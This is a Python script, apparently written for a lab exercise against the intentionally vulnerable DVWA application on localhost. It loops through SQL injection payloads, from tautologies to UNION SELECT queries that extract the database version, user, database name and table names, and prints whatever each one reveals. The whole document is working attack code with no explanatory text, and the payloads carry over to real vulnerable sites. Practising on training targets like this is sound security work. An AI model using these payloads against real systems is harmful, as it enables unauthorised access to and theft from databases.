    import requests
    from bs4 import BeautifulSoup

    url = "http://localhost/dvwa/vulnerabilities/sqli/"
    cookies = {
        'PHPSESSID': 'lme0tbjk2egn1urokbsipv7thv', 
        'security': 'low'
    }

    payloads = [
        "1",  
        "1' OR '1'='1",  
        "1' OR 1=1 -- ",  
        "' OR 1=1 --",  
        "1' UNION SELECT null, version() -- ",  
        "1' UNION SELECT user(), database() -- ",  
        "1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- "
    ]

    for payload in payloads:
        params = {'id': payload, 'Submit': 'Submit'}
        response = requests.get(url, params=params, cookies=cookies)

        print(f"\n=== Payload: {payload} ===")

        # Use BeautifulSoup to extract <pre> blocks
        soup = BeautifulSoup(response.text, 'html.parser')
        pre_tags = soup.find_all('pre')

        if pre_tags:
            print("[+] Output found:")
            for tag in pre_tags:
                print(tag.get_text())
        elif "error" in response.text.lower():
            print("[-] SQL error or rejected input.")
        else:
            print("[-] No visible output.")
